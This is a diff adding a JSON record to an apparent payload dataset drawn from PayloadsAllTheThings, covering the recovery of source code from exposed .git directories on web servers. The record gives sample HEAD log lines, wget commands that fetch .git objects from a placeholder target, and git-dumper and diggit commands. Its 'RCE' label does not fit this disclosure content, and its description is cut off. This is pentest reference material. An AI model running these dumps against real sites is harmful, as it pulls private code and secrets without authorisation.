@@ -1,0 +1,27 @@
+{
+  "id": "rce-1eb6aed2acbb",
+  "category": "RCE",
+  "title": "Git",
+  "description": "# Git\n\n## Summary\n\n* [Methodology](#methodology)\n    * [Recovering file contents from .git/logs/HEAD](#recovering-file-contents-from-gitlogshead)\n    * [Recovering file contents from .git/index](#recovering-file-contents-from-gitindex)\n* [Tools](#tools)\n    * [Automatic recovery](#automatic-recovery)\n        * [git-dumper.py](#git-dumperpy)\n        * [diggit.py](#diggitpy)\n        * [GoGitDumper](#gogitdumper)\n        * [rip-git](#rip-git)\n        * [GitHack](#githack)\n        * [GitTools](#gitt",
+  "payloads": [
+    "0000000000000000000000000000000000000000 15ca375e54f056a576905b41a417b413c57df6eb root <root@dfc2eabdf236.(none)> 1455532500 +0000        clone: from https://github.com/fermayo/hello-world-lamp.git",
+    "15ca375e54f056a576905b41a417b413c57df6eb 26e35470d38c4d6815bc4426a862d5399f04865c Michael <michael@easyctf.com> 1489390329 +0000        commit: Initial.",
+    "26e35470d38c4d6815bc4426a862d5399f04865c 6b4131bb3b84e9446218359414d636bda782d097 Michael <michael@easyctf.com> 1489390330 +0000        commit: Whoops! Remove flag.",
+    "6b4131bb3b84e9446218359414d636bda782d097 a48ee6d6ca840b9130fbaa73bbf55e9e730e4cfd Michael <michael@easyctf.com> 1489390332 +0000        commit: Prevent directory listing.",
+    "wget http://web.site/.git/objects/26/e35470d38c4d6815bc4426a862d5399f04865c",
+    "author Michael <michael@easyctf.com> 1489390329 +0000",
+    "committer Michael <michael@easyctf.com> 1489390329 +0000",
+    "wget http://web.site/.git/objects/32/3240a3983045cdc0dec2e88c1358e7998f2e39",
+    "wget http://web.site/.git/objects/cb/6139863967a752f3402b3975e97a84d152fd8f",
+    "Use the git index file parser <https://pypi.python.org/pypi/gin> (python3).",
+    "* [arthaud/git-dumper](https://github.com/arthaud/git-dumper)",
+    "./git-dumper.py http://web.site/.git ~/website",
+    "* [bl4de/security-tools/diggit](https://github.com/bl4de/security-tools/)",
+    "./diggit.py -u http://web.site -t /path/to/temp/folder/ -o d60fbeed6db32865a1f01bb9e485755f085f51c1",
+    "* [c-sto/gogitdumper](https://github.com/c-sto/gogitdumper)"
+  ],
+  "references": [
+    "PayloadsAllTheThings/Insecure Source Code Management/Git.md"
+  ],
+  "source": "PayloadsAllTheThings"
+}
